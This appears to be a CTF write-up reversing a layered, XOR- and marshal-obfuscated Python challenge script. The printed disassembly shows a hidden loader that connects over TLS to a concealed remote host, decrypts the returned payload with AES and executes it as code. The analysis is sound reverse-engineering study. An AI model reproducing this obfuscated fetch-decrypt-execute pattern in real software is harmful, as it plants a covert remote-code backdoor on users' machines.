---
layout: post
title:  "obfpyscated"
date:   2026-04-06 18:41:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /RITSECCTF-2026-obfpyscated/
---

**Category**: rev

**Author:** sy1vi3

**Description**: python is really easy to understand because it's basically just pseudocode lol. dockerfile provided for your convenience

I get the challenge files:
```shell
cat Dockerfile  
FROM python:3.10.2-slim  
  
RUN pip install --no-cache-dir pycryptodome pillow  
  
WORKDIR /run  
  
COPY meow.py .  
  
CMD [ "python3", "meow.py" ]

cat run.sh  
#!/bin/sh  
docker build -t obfpyscated .  
docker run --rm -it obfpyscated
```

`meow.py`:
```python
exec(''.join(chr(_^2)for _ in b']?nco`fc829]]?]]kormpv]]*%%,hmkl*ajp*k\\6:+dmp"k"kl"`%_S@AZS^^%++,nmcfq*`%%,hmkl**k\\05+,vm]`{vgq*3.%%,hmkl*ajp*k\\4;+"dmp"k"kl"`%^%. %++dmp"k"kl"`%z^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z33^z3`^z3`^z3`^z3f^z3`^z3`^z3`Z^z3`^z3`^z3`^zg:3^z3c^z3`^z3`^z5d^z3c^z5d^z3`u^z3`d^z3`^z5d^z3c^z5d^z3`u^z3cd^z3c^z5d^z3c^z5d^z3;u^z3;t^z3:d^z3;^z3c^z3`^z5d^z3c^z5d^z3`u^z3dd^z3:e^z3c^z``^z3g^z`c^z3`s^z3fe^z3`^z``^z3`e^z3`s^z3ae^z3`s^z31^z`c^z3;^z5d^z3:^z``^z30^z5d^z3d^z5d^z3g^z;d^z3`^z5d^z3f]^z3`^z;:^z3c^z`c^z3c^z5d^z3a^z;4^z3;d^z3de^z3d^z``^z33^z5d^z3:^z``^z30^z5d^z31^z5d^z3g^z;d^z3`^z5d^z30]^z3`^z;:^z3c^z`c^z3c^z5d^z33\x7f^z3;^z`c^z3c^z3c^z3`e^z3d^z``^z32^z5d^z32^z``^z30^z5d^z35^z5d^z3g^z;d^z3`^z5d^z34]^z3`^z;:^z3c^z`c^z3c^z`c^z3c^z3c^z3`^z5d^z32d^z3g^z30^z3`e^z3d^z``^z35^z5d^z36^z`c^z3cd^z3fe^z3fjIw^z3ge^z3ge^z3f.^z3`d^z3ghQe^z3d^z``^z34^z`c^z3`^z3c^z3`e^z3ge^z3g^z``^z37^z5d^z2`^z`c^z3c^z5d^l^d^z3`^z5d^z3`^z;g^z3;^z20^z3`d^z3ge^z3;s^z36^z5d^z32^z``^z30^z5d^v^z5d^z3g^z;d^z3`^z5d^`]^z3`^z;:^z3c^z`c^z3c^z5d^z2de^z3g^z5d^z2g^z5d^z3`^z;g^z3;^z20^z3`^z5d^p^z;4^z3:^z``^z2`e^z3g^z5d^z3`^z5d^d^z;g^z3;^z20^z3`e^z3g^z5d^d^z5d^z2g^z;g^z3;^z20^z3`^z`c^z3;d^z3ae^z3:^z``^le^z3a^z`c^z3cd^z31^z5d^z21^z5d^z20^z;d^z3`d^z30e^z31e^z30F^ve^z30^z;:^z3`^z3c^z3`^z5d^z3`J^z3`0^z23W^zd0^z3`^z3`^z3`^z3`^z`0^z3c^za3^z3:X\\J^za3^z3`z^z3c^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3;^z3`^z3`^z3`^z3d^z3`^z3`^z3`j^z3`^z3`^z3`^zg:^z25^z3`^z3`^z3`^z;c^z3`e^z3`D^z30d^z3cm^z3`e^z3c^z5d^z3`X^z3`^z;:^z3cO^z3`^z3c^z3`h^z3;^z5d^z3cJ^z3`0^z3;^zd03^z3`^z3`^z3`W^z`0^z3c^za3^z3:zqk^z`0^z3;^za3^z3;7)^za3^z3cp^z`0^z3`k^z35^z3`^z3`^z3`^zg3^z31^%tv^z5dlu|\'^za3^z3c\x7f^z31^z3`^z3`^z3`^zg:^z3d^z3`^z3`^z3`^z3;^z;`^z23^z3`^zg3^dt|vn7^%uvzxuj\'7^%~|w|aik\'^zg:^z36^z3`^z3`^z3`^^V\\D^z3d@J_EZV^z3dUJZ^z`0^z3c^za3^z36j|ko|kFqvjmwxt|z^z3c^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3;^z3`^z3`^z3`^z3d^z3`^z3`^z3`j^z3`^z3`^z3`k^z3g^z3`^z3`^z3`0^z3;^zd0^z34^z3`^z3`^z3`Wk^z3a^z3`^z3`^z3`k^z30^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z34^z3`^z3`^z3`k^z37^z3`^z3`^z3`^z30^z3`^z3`^z3`k^z36^z3`^z3`^z3`^zg:^z36^z3`^z3`^z3`yq{c:gmxb^z5dq:rm^z5d^zd0^zc2^z3c^z3`^z3`^zg:^z3`^z3`^z3`^z3`z^z3c^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3;^z3`^z3`^z3`^z31^z3`^z3`^z3`j^z3`^z3`^z3`^zg:)^z3`^z3`^z3`^z;c^z3`e^z3`D^`d^z3ce^z3c^z5d^z3`X^z3`^z``^z3`^z5d^z3c^z5d^z3;^z``^z3c^z5d^z3:^z5d^z3d^z;d^z3`^z5d^z3g]^z3`^z;:^z3c^z`c^z3c^z`c^z3;O^z3`^z3c^z3`h^z3;^z5d^z3fJ^z3`0^z3a^zd0M^z3`^z3`^z3`^zd0^z3c^z3`^z3`^z3`k^z3d^z3`^z3`^z3`z^z3c^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3;^z3`^z3`^z3`^z3d^z3`^z3`^z3`j^z3`^z3`^z3`k^z3g^z3`^z3`^z3`0^z3;^zd0\\^z3`^z3`^z3`Wk^z3a^z3`^z3`^z3`k^z30^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z34^z3`^z3`^z3`k^z37^z3`^z3`^z3`^z33^z3`^z3`^z3`k^z36^z3`^z3`^z3`^zg38t|vn7^%uvzxuj\'7^%~|w|aik\'7^%~|w|aik\'^zg:^z3:^z3`^z3`^z3`>5;W^z`0^z3;^za3^z31mvF{`m|j^za3^z3dsvpwk^z30^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z34^z3`^z3`^z3`k^z37^z3`^z3`^z3`^z33^z3`^z3`^z3`^zg:^z3d^z3`^z3`^z3`^z3;^z;`7^z3`^zg:O^z3`^z3`^z3`^`^l^z3`mb>9,9$.b>8>=$.$"8>^z32, "#*^z328>m^z25^z3`^z3`^z3db|c|@G^z25">9wm (":c>4!;$(c+4$@G^d"##(.9$"#wm.!">(@G@GM^zd0^z3`^z2`^z3`^z3`^zg:^z3d^z3`^z3`^z3`^z34^z33^z34^z33^zd0^z3d^z3`^z3`^z3`z^z3c^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3;^z3`^z3`^z3`^z31^z3`^z3`^z3`j^z3`^z3`^z3`k^z21^z3`^z3`^z3`0^z3a^zd0.^z3`^z3`^z3`k^z23^z3`^z3`^z3`k^z3d^z3`^z3`^z3`z^z3c^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3;^z3`^z3`^z3`^z3d^z3`^z3`^z3`j^z3`^z3`^z3`k^z3g^z3`^z3`^z3`0^z3;k^2^z3`^z3`^z3`Wk^z3a^z3`^z3`^z3`k^z30^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z34^z3`^z3`^z3`k^z37^z3`^z3`^z3`^`^z3`^z3`^z3`k^z36^z3`^z3`^z3`k^z25^z3`^z3`^z3`k^z24^z3`^z3`^z3`Wk^z27^z3`^z3`^z3`k^z30^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z34^z3`^z3`^z3`k^z37^z3`^z3`^z3`^`^z3`^z3`^z3`k8^z3`^z3`^z3`^zg:9^z3`^z3`^z3`-$^zg0^zf4^z;a^za0j"I^z`7,^z3;^zc0^zd1^z5d@x^zg0^zd1/U^zg1=!^z3cl^z;3R^d^za4^za1^zd0^zd0^z32^z3`^z3`^z3`^zd0^zg`^zg6^zg6^zg6^z`0^z3c^za3^z3gwvwz|^zd0^zd`^zg6^zg6^zg6z^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3`^z3c^z3`^z3`^z3`J^z3`^z3`^z3`^zg:^z3d^z3`^z3`^z3`^z5d^z3`J^z3`0^z3cWk^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z34^z3`^z3`^z3`k^z37^z3`^z3`^z3`^z2g^z3`^z3`^z3`^zg:^z3;^z3`^z3`^z3`^z3d^z3`^zg3^z2gt|vn7^%uvzxuj\'7FFFFFFF^z`0^`^za3^z3fjvzr|m^za3^z3:jju^za3^z34Zk`imv7Zpiq|kk^z3:^z3`^z3`^z3`^za3^z3atxkjqxu^za3^pzk|xm|F^z5d|\x7fxlumFzvwm|am^za3^z32nkxiFjvzr|m^za3^z3aX_FPW\\M^za3^z32JVZRFJMK\\XTk9^z3`^z3`^z3`^za3^z3azvww|zm^za3^z3aj|w^z5dxuu^za3^z3dk|zo^za3^z3gzuvj|^za3^z3gpw^z5d|a^za3^z3:w|n^za3^v^z5d|zk`imFxw^z5dFo|kp\x7f`^za3^z3guvx^z5dj^za3^z31FFzv^z5d|FF^z`0^z33k(^z3`^z3`^z3`k+^z3`^z3`^z3`k^z3:^z3`^z3`^z3`k-^z3`^z3`^z3`^za3^z3cF^za3^z3:FFF^za3^z3;FF^za3^z3gFFFFF^za3^z3fFFFFFF^za3^z3aFFFFFFFk^z35^z3`^z3`^z3`k^z35^z3`^z3`^z3`k^z34^z3`^z3`^z3`k^z37^z3`^z3`^z3`^z3:^z3`^z3`^z3`^zg:3^z3`^z3`^z3`^z31^z3c^z31^z3c^z35^z3c^z31^z3c7^z3c^z27^z3c^z23^z3c^z3d^z3c^z3;^z3c^z33^z3c^z3d^z3c^z3;^z3c^z31^z3c^z3;^zg5^z31^z3g^p^z3cY^z3c^z33^z3c^z31^z3c^z3f^z3c^z33^z3c%++9],]]amfg]]?]]9]*+'))
```

Running it in docker:
```shell
docker run --rm -it obfpyscated  
Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg.  
ERRO[0000] User-selected graph driver "overlay" overwritten by graph driver "vfs" from database - delete libpod local files ("/home/user/.local/share/containers/storage") to resolve.  May prevent use of images created by other tools  
mreow: GIVE ME THE FLAG  
hiss
```

Step one is XOR each byte with `2`:
```python
python3 - << 'EOF'  
with open("meow.py","rb") as f:  
import re  
payload = re.search(rb"b'(.*)'", f.read()).group(1)  
  
decoded = ''.join(chr(b ^ 2) for b in payload)  
print(decoded)  
EOF

_=lambda:0;__=__import__(''.join(chr(i^^48)for i in b']QBCXQ\\')).loads(b''.join((i^^27).to_bytes(1,''.join(chr(i^^69) for i in b'\',"'))for i in b'x\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x11\x1b\x1b\x1b\x1d\x1b\x1b\x1bX\x1b\x1b\x1b\xe81\x1a\x1b\x1b\x7f\x1a\x7f\x1bw\x1bf\x1b\x7f\x1a\x7f\x1bw\x1af\x1a\x7f\x1a\x7f\x19w\x19v\x18f\x19\x1a\x1b\x7f\x1a\x7f\x1bw\x1ff\x18g\x1a\xbb\x1e\xba\x1bq\x1dg\x1b\xbb\x1bg\x1bq\x1cg\x1bq\x13\xba\x19\x7f\x18\xbb\x12\x7f\x1f\x7f\x1e\x9f\x1b\x7f\x1d_\x1b\x98\x1a\xba\x1a\x7f\x1c\x96\x19f\x1fg\x1f\xbb\x11\x7f\x18\xbb\x12\x7f\x13\x7f\x1e\x9f\x1b\x7f\x12_\x1b\x98\x1a\xba\x1a\x7f\x11^z5d\x19\xba\x1a\x1a\x1bg\x1f\xbb\x10\x7f\x10\xbb\x12\x7f\x17\x7f\x1e\x9f\x1b\x7f\x16_\x1b\x98\x1a\xba\x1a\xba\x1a\x1a\x1b\x7f\x10f\x1e\x12\x1bg\x1f\xbb\x17\x7f\x14\xba\x1af\x1dg\x1dhKu\x1eg\x1eg\x1d,\x1bf\x1ejSg\x1f\xbb\x16\xba\x1b\x1a\x1bg\x1eg\x1e\xbb\x15\x7f\x0b\xba\x1a\x7f\n\f\x1b\x7f\x1b\x9e\x19\x02\x1bf\x1eg\x19q\x14\x7f\x10\xbb\x12\x7f\t\x7f\x1e\x9f\x1b\x7f\b_\x1b\x98\x1a\xba\x1a\x7f\x0fg\x1e\x7f\x0e\x7f\x1b\x9e\x19\x02\x1b\x7f\r\x96\x18\xbb\x0bg\x1e\x7f\x1b\x7f\f\x9e\x19\x02\x1bg\x1e\x7f\f\x7f\x0e\x9e\x19\x02\x1b\xba\x19f\x1cg\x18\xbb\ng\x1c\xba\x1af\x13\x7f\x03\x7f\x02\x9f\x1bf\x12g\x13g\x12D\tg\x12\x98\x1b\x1a\x1b\x7f\x1bH\x1b2\x01U\xf2\x1b\x1b\x1b\x1b\xb2\x1a\xc1\x18Z^^H\xc1\x1bx\x1a\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x19\x1b\x1b\x1b\x1f\x1b\x1b\x1bh\x1b\x1b\x1b\xe8\x07\x1b\x1b\x1b\x9a\x1bg\x1bF\x12f\x1ao\x1bg\x1a\x7f\x1bZ\x1b\x98\x1aM\x1b\x1a\x1bj\x19\x7f\x1aH\x1b2\x19\xf21\x1b\x1b\x1bU\xb2\x1a\xc1\x18xsi\xb2\x19\xc1\x195+\xc1\x1ar\xb2\x1bi\x17\x1b\x1b\x1b\xe1\x13\'vt\x7fnw~^%\xc1\x1a^z5d\x13\x1b\x1b\x1b\xe8\x1f\x1b\x1b\x1b\x19\x9b\x01\x1b\xe1\fv~tl5\'wtxzwh^%5\'|~u~cki^%\xe8\x14\x1b\x1b\x1b\\T^^F\x1fBH]GXT\x1fWHX\xb2\x1a\xc1\x14h~im~iDsthouzv~x\x1a\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x19\x1b\x1b\x1b\x1f\x1b\x1b\x1bh\x1b\x1b\x1bi\x1e\x1b\x1b\x1b2\x19\xf2\x16\x1b\x1b\x1bUi\x1c\x1b\x1b\x1bi\x12\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x16\x1b\x1b\x1bi\x15\x1b\x1b\x1b\x12\x1b\x1b\x1bi\x14\x1b\x1b\x1b\xe8\x14\x1b\x1b\x1b{sya8eoz`\x7fs8po\x7f\xf2\xa0\x1a\x1b\x1b\xe8\x1b\x1b\x1b\x1bx\x1a\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x19\x1b\x1b\x1b\x13\x1b\x1b\x1bh\x1b\x1b\x1b\xe8+\x1b\x1b\x1b\x9a\x1bg\x1bF\bf\x1ag\x1a\x7f\x1bZ\x1b\xbb\x1b\x7f\x1a\x7f\x19\xbb\x1a\x7f\x18\x7f\x1f\x9f\x1b\x7f\x1e_\x1b\x98\x1a\xba\x1a\xba\x19M\x1b\x1a\x1bj\x19\x7f\x1dH\x1b2\x1c\xf2O\x1b\x1b\x1b\xf2\x1a\x1b\x1b\x1bi\x1f\x1b\x1b\x1bx\x1a\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x19\x1b\x1b\x1b\x1f\x1b\x1b\x1bh\x1b\x1b\x1bi\x1e\x1b\x1b\x1b2\x19\xf2^^\x1b\x1b\x1bUi\x1c\x1b\x1b\x1bi\x12\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x16\x1b\x1b\x1bi\x15\x1b\x1b\x1b\x11\x1b\x1b\x1bi\x14\x1b\x1b\x1b\xe1:v~tl5\'wtxzwh^%5\'|~u~cki^%5\'|~u~cki^%\xe8\x18\x1b\x1b\x1b<79U\xb2\x19\xc1\x13otDybo~h\xc1\x1fqtrui\x12\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x16\x1b\x1b\x1bi\x15\x1b\x1b\x1b\x11\x1b\x1b\x1b\xe8\x1f\x1b\x1b\x1b\x19\x9b5\x1b\xe8M\x1b\x1b\x1b\b\n\x1bo`<;.;&,`<:<?&,& :<\x10." !(\x10:<o\x07\x1b\x1b\x1f`~a~BE\x07 <;uo"* 8a<6#9&*a)6&BE\f !!*,;& !uo,# <*BEBEO\xf2\x1b\x0b\x1b\x1b\xe8\x1f\x1b\x1b\x1b\x16\x11\x16\x11\xf2\x1f\x1b\x1b\x1bx\x1a\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x19\x1b\x1b\x1b\x13\x1b\x1b\x1bh\x1b\x1b\x1bi\x03\x1b\x1b\x1b2\x1c\xf2,\x1b\x1b\x1bi\x01\x1b\x1b\x1bi\x1f\x1b\x1b\x1bx\x1a\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x19\x1b\x1b\x1b\x1f\x1b\x1b\x1bh\x1b\x1b\x1bi\x1e\x1b\x1b\x1b2\x19i\0\x1b\x1b\x1bUi\x1c\x1b\x1b\x1bi\x12\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x16\x1b\x1b\x1bi\x15\x1b\x1b\x1b\b\x1b\x1b\x1bi\x14\x1b\x1b\x1bi\x07\x1b\x1b\x1bi\x06\x1b\x1b\x1bUi\x05\x1b\x1b\x1bi\x12\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x16\x1b\x1b\x1bi\x15\x1b\x1b\x1b\b\x1b\x1b\x1bi:\x1b\x1b\x1b\xe8;\x1b\x1b\x1b/&\xe2\xd6\x9c\xc2hK\xb5.\x19\xa2\xf3\x7fBz\xe2\xf3-W\xe3?#\x1an\x91P\f\xc6\xc3\xf2\xf2\x10\x1b\x1b\x1b\xf2\xeb\xe4\xe4\xe4\xb2\x1a\xc1\x1eutux~\xf2\xfb\xe4\xe4\xe4x\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1b\x1a\x1b\x1b\x1bH\x1b\x1b\x1b\xe8\x1f\x1b\x1b\x1b\x7f\x1bH\x1b2\x1aUi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x16\x1b\x1b\x1bi\x15\x1b\x1b\x1b\x0e\x1b\x1b\x1b\xe8\x19\x1b\x1b\x1b\x1f\x1b\xe1\x0ev~tl5\'wtxzwh^%5DDDDDDD\xb2\b\xc1\x1dhtxp~o\xc1\x18hhw\xc1\x16Xibkot5Xrks~ii\x18\x1b\x1b\x1b\xc1\x1cvzihszw\xc1\rxi~zo~D\x7f~^z5dznwoDxtuo~co\xc1\x10lizkDhtxp~o\xc1\x1cZ]DRU^^O\xc1\x10HTXPDHOI^^ZVi;\x1b\x1b\x1b\xc1\x1cxtuu~xo\xc1\x1ch~u\x7fzww\xc1\x1fi~xm\xc1\x1exwth~\xc1\x1eru\x7f~c\xc1\x18u~l\xc1\t\x7f~xibkoDzu\x7fDm~ir^z5db\xc1\x1ewtz\x7fh\xc1\x13DDxt\x7f~DD\xb2\x11i*\x1b\x1b\x1bi)\x1b\x1b\x1bi\x18\x1b\x1b\x1bi/\x1b\x1b\x1b\xc1\x1aD\xc1\x18DDD\xc1\x19DD\xc1\x1eDDDDD\xc1\x1dDDDDDD\xc1\x1cDDDDDDDi\x17\x1b\x1b\x1bi\x17\x1b\x1b\x1bi\x16\x1b\x1b\x1bi\x15\x1b\x1b\x1b\x18\x1b\x1b\x1b\xe81\x1b\x1b\x1b\x13\x1a\x13\x1a\x17\x1a\x13\x1a5\x1a\x05\x1a\x01\x1a\x1f\x1a\x19\x1a\x11\x1a\x1f\x1a\x19\x1a\x13\x1a\x19\xe7\x13\x1e\r\x1a[\x1a\x11\x1a\x13\x1a\x1d\x1a\x11\x1a'));_.__code__=__;_()
```

Looking at the beginning there are some strings XORed:
```python
_=lambda:0;__=__import__(''.join(chr(i^^48)for i in b']QBCXQ\\')).loads(b''.join((i^^27).to_bytes(1,''.join(chr(i^^69) for i in b'\',"'))for i in b' ... etc
```

```python
python3  
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> data = b'\',"'  
... decoded = bytes(b ^ 69 for b in data)  
... print(decoded)    
...  
b'big'  
```

```python
>>> data = b']QBCXQ\\'  
... decoded = bytes(b ^ 48 for b in data)  
... print(decoded)   
...  
b'marshal'  
```

It becomes:
```python
_ = lambda: 0
__ = __import__("marshal").loads(b"".join((i ^ 27).to_bytes(1, "big") for i in b"..."))
_.__code__ = __
_()
```

The remaining bytestring here needs XORed with `27`. I run this (in python `3.10`) to get the disassembly:
```python
docker run --rm -it obfpyscated python3  
Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg.  
ERRO[0000] User-selected graph driver "overlay" overwritten by graph driver "vfs" from database - delete libpod local files ("/home/user/.local/share/containers/storage") to resolve.  May prevent use of images created by other tools  
Python 3.10.2 (main, Mar  2 2022, 03:44:48) [GCC 10.2.1 20210110] on linux  
Type "help", "copyright", "credits" or "license" for more information.
>>> import re, marshal, dis, ast  
>>>  
>>> data = open("meow.py","rb").read()  
>>>  
>>> payload = ast.literal_eval(re.search(rb"b'(?:\\.|[^'])*'", data).group())
>>> layer1 = bytes(b ^ 2 for b in payload).decode()  
>>>  
>>> # find every bytes literal  
>>> literals = re.findall(r"b'(?:\\.|[^'])*'", layer1)  
>>>  
>>> print("Found", len(literals), "byte literals")  
Found 4 byte literals  
>>>  
>>> # choose the largest (marshal payload)  
>>> blob = ast.literal_eval(max(literals, key=len))  
>>>  
>>> decoded = bytes(b ^ 27 for b in blob)  
>>>  
>>> obj = marshal.loads(decoded)  
>>>  
>>> print(type(obj))  
<class 'code'>  
>>>  
>>> if hasattr(obj, "co_code"):  
...     dis.dis(obj)  
... else:  
...     print(obj)
```

Output:
```shell
4           0 LOAD_CONST               1 (0)  
2 LOAD_CONST               0 (None)  
4 IMPORT_NAME              0 (socket)  
6 STORE_FAST               0 (socket)  
  
5           8 LOAD_CONST               1 (0)  
10 LOAD_CONST               0 (None)  
12 IMPORT_NAME              1 (ssl)  
14 STORE_FAST               1 (ssl)  
  
6          16 LOAD_CONST               1 (0)  
18 LOAD_CONST               2 (('AES',))  
20 IMPORT_NAME              2 (Crypto.Cipher)  
22 IMPORT_FROM              3 (AES)  
24 STORE_FAST               2 (AES)  
26 POP_TOP  
  
7          28 LOAD_CONST               1 (0)  
30 LOAD_CONST               0 (None)  
32 IMPORT_NAME              4 (marshal)  
34 STORE_FAST               3 (marshal)  
  
8          36 LOAD_FAST                1 (ssl)  
38 LOAD_METHOD              5 (create_default_context)  
40 CALL_METHOD              0  
42 LOAD_ATTR                6 (wrap_socket)  
44 LOAD_FAST                0 (socket)  
46 LOAD_METHOD              0 (socket)  
48 LOAD_FAST                0 (socket)  
50 LOAD_ATTR                7 (AF_INET)  
52 LOAD_FAST                0 (socket)  
54 LOAD_ATTR                8 (SOCK_STREAM)  
56 CALL_METHOD              2  
58 LOAD_CONST               3 ('')  
60 LOAD_METHOD              9 (join)  
62 LOAD_CONST               4 (<code object f at 0x7f8b9b9096e0, file "<module>", line 8>)  
64 LOAD_CONST               5 ('meow.<locals>.<genexpr>')  
66 MAKE_FUNCTION            0  
68 LOAD_CONST               6 (b'GOE]\x04YSF\\CO\x04LSC')  
70 GET_ITER  
72 CALL_FUNCTION            1  
74 CALL_METHOD              1  
76 LOAD_CONST               7 (('server_hostname',))  
78 CALL_FUNCTION_KW         2  
80 STORE_FAST               4 (_)  
  
9          82 LOAD_FAST                4 (_)  
84 LOAD_METHOD             10 (connect)  
86 LOAD_CONST               3 ('')  
88 LOAD_METHOD              9 (join)  
90 LOAD_CONST               8 (<code object f at 0x7f8b9b9099a0, file "<module>", line 9>)  
92 LOAD_CONST               5 ('meow.<locals>.<genexpr>')  
94 MAKE_FUNCTION            0  
96 LOAD_CONST               9 (b'`hbz#~ta{dh#ktd')  
98 GET_ITER  
100 CALL_FUNCTION            1  
102 CALL_METHOD              1  
104 LOAD_CONST              10 (443)  
106 BUILD_TUPLE              2  
108 CALL_METHOD              1  
110 POP_TOP  
  
10         112 LOAD_FAST                4 (_)  
114 LOAD_METHOD             11 (sendall)  
116 LOAD_CONST              11 (b'')  
118 LOAD_METHOD              9 (join)  
120 LOAD_CONST              12 (<code object f at 0x7f8b9b909bb0, file "<module>", line 10>)  
122 LOAD_CONST               5 ('meow.<locals>.<genexpr>')  
124 MAKE_FUNCTION            0  
126 LOAD_CONST              13 (b'\x13\x11\x00t{\' 5 =7{\'!\'$=7=;!\'\x0b59;:3\x0b!\'t\x1c\x00\x00\x04{ezeY^\x1c;\' nt91;#z\'-8"=1z2-=Y^\x17;::17 =;:nt78;\'1Y^Y^')  
128 GET_ITER  
130 CALL_FUNCTION            1  
132 CALL_METHOD              1  
134 CALL_METHOD              1  
136 POP_TOP  
  
11         138 LOAD_CONST              11 (b'')  
140 STORE_FAST               5 (___)  
  
12         142 NOP  
  
13     >>  144 LOAD_FAST                4 (_)  
146 LOAD_METHOD             12 (recv)  
148 LOAD_CONST              15 (4096)  
150 CALL_METHOD              1  
152 STORE_FAST               6 (__)  
  
14         154 LOAD_FAST                6 (__)  
156 POP_JUMP_IF_TRUE        80 (to 160)  
  
15         158 JUMP_FORWARD             5 (to 170)  
  
16     >>  160 LOAD_FAST                5 (___)  
162 LOAD_FAST                6 (__)  
164 INPLACE_ADD  
166 STORE_FAST               5 (___)  
  
12         168 JUMP_ABSOLUTE           72 (to 144)  
  
17     >>  170 LOAD_FAST                4 (_)  
172 LOAD_METHOD             13 (close)  
174 CALL_METHOD              0  
176 POP_TOP  
  
18         178 LOAD_FAST                5 (___)  
180 LOAD_FAST                5 (___)  
182 LOAD_METHOD             14 (index)  
184 LOAD_CONST              16 (b'\r\n\r\n')  
186 CALL_METHOD              1  
188 LOAD_CONST              17 (4)  
190 BINARY_ADD  
192 LOAD_CONST               0 (None)  
194 BUILD_SLICE              2  
196 BINARY_SUBSCR  
198 STORE_FAST               5 (___)  
  
19         200 LOAD_FAST                2 (AES)  
202 LOAD_ATTR               15 (new)  
204 LOAD_CONST              11 (b'')  
206 LOAD_METHOD              9 (join)  
208 LOAD_CONST              18 (<code object f at 0x7f8b9b909e70, file "<module>", line 19>)  
210 LOAD_CONST               5 ('meow.<locals>.<genexpr>')  
212 MAKE_FUNCTION            0  
214 LOAD_CONST              19 (b'4=\xf9\xcd\x87\xd9s;P\xae5\x02\xb9\xe8dYa\xf9\xe86L\xf8$8\x01u\x8aK\x17\xdd\xd8\xe9')  
216 GET_ITER  
218 CALL_FUNCTION            1  
220 CALL_METHOD              1  
222 LOAD_CONST              20 (11)  
224 LOAD_FAST                5 (___)  
226 LOAD_CONST              21 (-16)  
228 LOAD_CONST               0 (None)  
230 BUILD_SLICE              2  
232 BINARY_SUBSCR  
234 LOAD_CONST              22 (('nonce',))  
236 CALL_FUNCTION_KW         3  
238 LOAD_METHOD             16 (decrypt_and_verify)  
240 LOAD_FAST                5 (___)  
242 LOAD_CONST               0 (None)  
244 LOAD_CONST              23 (-32)  
246 BUILD_SLICE              2  
248 BINARY_SUBSCR  
250 LOAD_FAST                5 (___)  
252 LOAD_CONST              23 (-32)  
254 LOAD_CONST              21 (-16)  
256 BUILD_SLICE              2  
258 BINARY_SUBSCR  
260 CALL_METHOD              2  
262 STORE_FAST               7 (_____)  
  
20         264 LOAD_FAST                3 (marshal)  
266 LOAD_METHOD             17 (loads)  
268 LOAD_FAST                7 (_____)  
270 CALL_METHOD              1  
272 STORE_FAST               8 (______)  
  
21         274 LOAD_CONST              24 (<code object f at 0x7f8b9b90a6b0, file "<module>", line 21>)  
276 LOAD_CONST              25 ('meow.<locals>._______')  
278 MAKE_FUNCTION            0  
280 STORE_FAST               9 (_______)  
  
22         282 LOAD_FAST                8 (______)  
284 LOAD_FAST                9 (_______)  
286 STORE_ATTR              18 (__code__)  
  
23         288 LOAD_FAST                9 (_______)  
290 CALL_FUNCTION            0  
292 POP_TOP  
294 LOAD_CONST               0 (None)  
296 RETURN_VALUE  
  
Disassembly of <code object f at 0x7f8b9b9096e0, file "<module>", line 8>:  
0 GEN_START                0  
  
8           2 LOAD_FAST                0 (.0)  
>>    4 FOR_ITER                 9 (to 24)  
6 STORE_FAST               1 (i)  
8 LOAD_GLOBAL              0 (chr)  
10 LOAD_FAST                1 (i)  
12 LOAD_CONST               0 (42)  
14 BINARY_XOR  
16 CALL_FUNCTION            1  
18 YIELD_VALUE  
20 POP_TOP  
22 JUMP_ABSOLUTE            2 (to 4)  
>>   24 LOAD_CONST               1 (None)  
26 RETURN_VALUE  
  
Disassembly of <code object f at 0x7f8b9b9099a0, file "<module>", line 9>:  
0 GEN_START                0  
  
9           2 LOAD_FAST                0 (.0)  
>>    4 FOR_ITER                 9 (to 24)  
6 STORE_FAST               1 (i)  
8 LOAD_GLOBAL              0 (chr)  
10 LOAD_FAST                1 (i)  
12 LOAD_CONST               0 (13)  
14 BINARY_XOR  
16 CALL_FUNCTION            1  
18 YIELD_VALUE  
20 POP_TOP  
22 JUMP_ABSOLUTE            2 (to 4)  
>>   24 LOAD_CONST               1 (None)  
